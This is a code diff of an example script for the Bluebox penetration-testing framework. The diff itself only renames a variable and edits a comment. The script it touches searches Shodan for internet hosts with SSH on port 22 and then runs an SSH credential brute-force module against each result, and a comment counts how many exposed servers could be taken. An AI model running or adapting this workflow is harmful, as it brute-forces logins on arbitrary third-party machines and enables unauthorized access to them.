@@ -1,7 +1,7 @@
 #!/usr/bin/env node
 
 /*
-  Copyright Jesús Pérez <jesusprubio@gmail.com>
+  Copyright Jesús Pérez <jesusprubio@fsf.org>
 
   This code may only be used under the MIT license found at
   https://opensource.org/licenses/MIT.
@@ -15,10 +15,10 @@ const util = require('util');
 const Bluebox = require('../');
 const utils = require('../lib/utils');
 
-const box = new Bluebox();
+const bBox = new Bluebox();
 
 
-box.events.on('info', (info) => {
+bBox.events.on('info', (info) => {
   let toAdd = ':(';
   if (info.valid) { toAdd = ':)'; }
 
@@ -29,7 +29,7 @@ box.events.on('info', (info) => {
 });
 
 console.log('Looking for hosts ...');
-box.run('gather/shodan/search', {
+bBox.run('gather/shodan/search', {
   query: 'ssh port:22',
   keyS: 'yourShodanKeyGoesHere',
   timeout: 20000,
@@ -55,7 +55,7 @@ box.run('gather/shodan/search', {
   // - https://www.shodan.io
   // eslint-disable-next-line max-len
   // - http://www.computerworld.com/article/3084438/security/a-black-market-is-selling-access-to-hacked-government-servers-for-6.html
-  //  - 12960248/100*5 = 648012.4
+  //  - 12960248, 3% = 38880.72
 
   // NOTE: Comment the next line to run the full example.
   // process.exit();
@@ -68,7 +68,7 @@ box.run('gather/shodan/search', {
   const bruteHost = host => new Promise((resolve) => {
     console.log(`\nStarting for: ${host.ip}: ${host.port} ...`);
 
-    box.run('gather/ssh/bruteCred', {
+    bBox.run('gather/ssh/bruteCred', {
       rhost: host.ip,
       rport: host.port,
       // timeout: 25000,
@@ -97,7 +97,7 @@ box.run('gather/shodan/search', {
   utils.pMap(hostsClean, bruteHost, { concurrency: 1 })
   .then(() => {
     console.log('\nDone, result:');
-    console.log(util.inspect(box.hosts, false, null));
+    console.log(util.inspect(bBox.hosts, false, null));
   })
   .catch(err => console.error('Error, exploring the hosts', err));
 })
